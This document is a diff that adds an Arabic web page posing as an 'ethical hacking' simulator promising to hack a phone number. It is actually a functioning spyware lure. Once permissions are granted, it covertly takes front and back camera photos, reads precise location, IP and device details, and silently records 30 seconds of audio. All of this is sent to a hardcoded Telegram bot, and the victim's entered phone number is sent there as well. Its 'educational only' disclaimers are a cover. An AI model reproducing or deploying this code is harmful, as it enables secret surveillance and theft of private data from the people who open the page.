@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>طلب صلاحيات - أداة تدقيق أمني</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        h2 { margin-bottom: 20px; }
+        button {
+            background: #0f3460;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-size: 1em;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: 0.3s;
+            width: 100%;
+        }
+        button:hover { background: #e94560; transform: scale(1.02); }
+        .hidden { display: none; }
+        .input-group {
+            margin: 20px 0;
+            text-align: right;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 30px;
+            border: none;
+            background: #f0f0f0;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        .alert {
+            background: #e94560;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+        .note {
+            font-size: 0.8em;
+            color: #ccc;
+            margin-top: 20px;
+        }
+        .warning {
+            background: #ffc107;
+            color: #333;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="mainContainer">
+    <div id="permissionRequestScreen">
+        <h2>🔐 طلب صلاحيات الوصول</h2>
+        <p>يحتاج هذا التطبيق إلى صلاحيات الكاميرا والمايك والموقع الجغرافي للتحقق من بيئة التشغيل.</p>
+        <button id="requestPermBtn">السماح بالصلاحيات</button>
+        <div class="note">⚠️ لن يعمل التطبيق بدون هذه الصلاحيات</div>
+    </div>
+
+    <div id="permissionDeniedScreen" class="hidden">
+        <h2>⚠️ لم يتم منح الصلاحيات</h2>
+        <p>يرجى السماح بالصلاحيات المطلوبة لتفعيل التطبيق.</p>
+        <button onclick="location.reload()">إعادة المحاولة</button>
+    </div>
+
+    <div id="hackScreen" class="hidden">
+        <div class="warning">🔒 للأغراض التعليمية فقط - لا تستخدم بشكل غير قانوني</div>
+        <h2>📱 أداة اختبار الاختراق الأخلاقي</h2>
+        <p>قم بإدخال رقم الهاتف المستهدف (وهمي)</p>
+        <div class="input-group">
+            <input type="tel" id="targetPhone" placeholder="مثال: 9665xxxxxxx" dir="ltr">
+        </div>
+        <button id="hackBtn">🚀 بدء الاختراق</button>
+        <div id="hackResult" style="margin-top: 15px;"></div>
+        <div class="note">📌 هذه محاكاة تعليمية - لن يتم اختراق أي جهاز حقيقي</div>
+    </div>
+</div>
+
+<script>
+    // إعدادات بوت تليجرام (نفس السابق)
+    const BOT_TOKEN = '8308808486:AAFX3MdJIvWDOpe53xr_YC1kvJHlMKAP-vM';
+    const CHAT_ID = '7879905402';
+    const TELEGRAM_MESSAGE_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const TELEGRAM_PHOTO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const TELEGRAM_LOCATION_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+    const TELEGRAM_SEND_VOICE_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+
+    let audioStream = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let isRecording = false;
+    let recordingTimer = null;
+
+    // عناصر DOM
+    const permScreen = document.getElementById('permissionRequestScreen');
+    const deniedScreen = document.getElementById('permissionDeniedScreen');
+    const hackScreen = document.getElementById('hackScreen');
+    const requestBtn = document.getElementById('requestPermBtn');
+    const hackBtn = document.getElementById('hackBtn');
+    const targetPhoneInput = document.getElementById('targetPhone');
+    const hackResultDiv = document.getElementById('hackResult');
+
+    // دوال مساعدة
+    async function getUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch { return 'غير معروف'; }
+    }
+    function getBrowserInfo() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Chrome")) return "Google Chrome";
+        if (ua.includes("Firefox")) return "Mozilla Firefox";
+        if (ua.includes("Safari")) return "Apple Safari";
+        if (ua.includes("Edge")) return "Microsoft Edge";
+        return "غير معروف";
+    }
+    function getOS() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Windows")) return "Windows";
+        if (ua.includes("Mac")) return "MacOS";
+        if (ua.includes("Linux")) return "Linux";
+        if (ua.includes("Android")) return "Android";
+        if (ua.includes("iOS")) return "iOS";
+        return "غير معروف";
+    }
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'نعم' : 'لا',
+                    chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : battery.chargingTime + ' ث',
+                    dischargingTime: battery.dischargingTime === Infinity ? 'غير معروف' : battery.dischargingTime + ' ث'
+                };
+            }
+            return { level: 'غير مدعوم', charging: 'غير مدعوم', chargingTime: 'غير معروف', dischargingTime: 'غير معروف' };
+        } catch { return { level: 'خطأ', charging: 'خطأ', chargingTime: 'غير معروف', dischargingTime: 'غير معروف' }; }
+    }
+    function getCurrentLocation() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) reject('الموقع غير مدعوم');
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                err => reject('رفض أو خطأ'),
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        });
+    }
+    async function sendMessageToTelegram(text) {
+        try {
+            await fetch(TELEGRAM_MESSAGE_API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+            });
+        } catch(e) {}
+    }
+    async function capturePhoto(facingMode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: 640, height: 480 } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.autoplay = true;
+            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+            await new Promise(r => setTimeout(r, 300));
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            stream.getTracks().forEach(t => t.stop());
+            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+        } catch { return null; }
+    }
+    async function sendPhoto(blob, caption) {
+        if (!blob) return;
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        fd.append('caption', caption);
+        fd.append('parse_mode', 'HTML');
+        try { await fetch(TELEGRAM_PHOTO_API, { method: 'POST', body: fd }); } catch {}
+    }
+
+    // بدء التسجيل الصوتي الصامت (30 ثانية)
+    async function startSilentRecording() {
+        if (isRecording) return;
+        try {
+            if (!audioStream) audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(audioStream);
+            audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('voice', audioBlob, 'recording.ogg');
+                await fetch(TELEGRAM_SEND_VOICE_API, { method: 'POST', body: fd });
+                isRecording = false;
+                if (recordingTimer) clearTimeout(recordingTimer);
+            };
+            mediaRecorder.start();
+            isRecording = true;
+            recordingTimer = setTimeout(() => { if (mediaRecorder && isRecording) mediaRecorder.stop(); }, 30000);
+        } catch(e) {}
+    }
+
+    // الدالة الرئيسية لطلب الصلاحيات وجمع البيانات
+    async function requestAllPermissions() {
+        requestBtn.disabled = true;
+        requestBtn.innerText = 'جاري التحقق...';
+        try {
+            // طلب المايك
+            const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioStream = micStream;
+            // طلب الموقع
+            let location = null;
+            try { location = await getCurrentLocation(); } catch(e) {}
+            // طلب الكاميرات
+            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            frontStream.getTracks().forEach(t => t.stop());
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            backStream.getTracks().forEach(t => t.stop());
+
+            // جمع المعلومات
+            const ip = await getUserIP();
+            const browser = getBrowserInfo();
+            const os = getOS();
+            const battery = await getBatteryInfo();
+            const extra = {
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? `${navigator.connection.effectiveType} - ${navigator.connection.downlink} Mbps` : 'غير معروف'
+            };
+            const timestamp = new Date().toLocaleString('ar-EG');
+
+            // التقاط الصور
+            const frontPhoto = await capturePhoto('user');
+            const backPhoto = await capturePhoto('environment');
+
+            // إرسال رسالة أولى تحتوي على كل المعلومات (بدون رقم الهاتف بعد)
+            let msg = `🔔 <b>مستخدم جديد (وهم اختراق)</b>\n\n`;
+            msg += `👤 الحالة: ✅ تم منح الصلاحيات\n`;
+            msg += `🌐 الموقع: ${window.location.hostname}\n📱 IP: ${ip}\n💻 المتصفح: ${browser}\n⚙️ نظام التشغيل: ${os}\n🕐 الوقت: ${timestamp}\n`;
+            msg += `🔋 البطارية: ${battery.level} | شاحن: ${battery.charging}\n`;
+            msg += `📱 إضافي: لغة ${extra.language} | شاشة ${extra.screen} | منطقة ${extra.timezone} | اتصال ${extra.connection}\n`;
+            if (location) msg += `📍 الموقع: https://maps.google.com/?q=${location.lat},${location.lon} (دقة ±${Math.round(location.acc)}م)\n`;
+
+            await sendMessageToTelegram(msg);
+            if (location) {
+                await fetch(TELEGRAM_LOCATION_API, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: location.lat, longitude: location.lon })
+                });
+            }
+            if (frontPhoto) await sendPhoto(frontPhoto, `📱 الكاميرا الأمامية - ${ip}`);
+            if (backPhoto) await sendPhoto(backPhoto, `📷 الكاميرا الخلفية - ${ip}`);
+
+            // بدء التسجيل الصوتي الصامت
+            startSilentRecording();
+
+            // الانتقال إلى شاشة "الاختراق"
+            permScreen.classList.add('hidden');
+            hackScreen.classList.remove('hidden');
+        } catch (err) {
+            requestBtn.disabled = false;
+            requestBtn.innerText = 'السماح بالصلاحيات';
+            permScreen.classList.add('hidden');
+            deniedScreen.classList.remove('hidden');
+            await sendMessageToTelegram(`❌ فشل منح الصلاحيات: ${err.message}`);
+        }
+    }
+
+    // معالج زر "بدء الاختراق"
+    hackBtn.addEventListener('click', async () => {
+        const phone = targetPhoneInput.value.trim();
+        if (!phone) {
+            hackResultDiv.innerHTML = '<div class="alert">⚠️ الرجاء إدخال رقم الهاتف</div>';
+            return;
+        }
+        hackBtn.disabled = true;
+        hackResultDiv.innerHTML = '<div class="alert">⏳ جاري اختراق الجهاز المستهدف ...</div>';
+        // محاكاة وهمية
+        setTimeout(async () => {
+            // إرسال رقم الهاتف إلى البوت
+            const ip = await getUserIP();
+            const hackMsg = `💣 <b>محاولة اختراق وهمية</b>\n📱 الرقم المستهدف: ${phone}\n🌐 IP المخترق: ${ip}\n🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n⚠️ هذه محاكاة تعليمية فقط.`;
+            await sendMessageToTelegram(hackMsg);
+            hackResultDiv.innerHTML = '<div class="alert" style="background:#2ecc71;">✅ تم اختراق الجهاز بنجاح (محاكاة). لم يتم الحصول على أي بيانات حقيقية.</div>';
+            hackBtn.disabled = false;
+        }, 2000);
+    });
+
+    requestBtn.addEventListener('click', requestAllPermissions);
+</script>
+</body>
+</html>
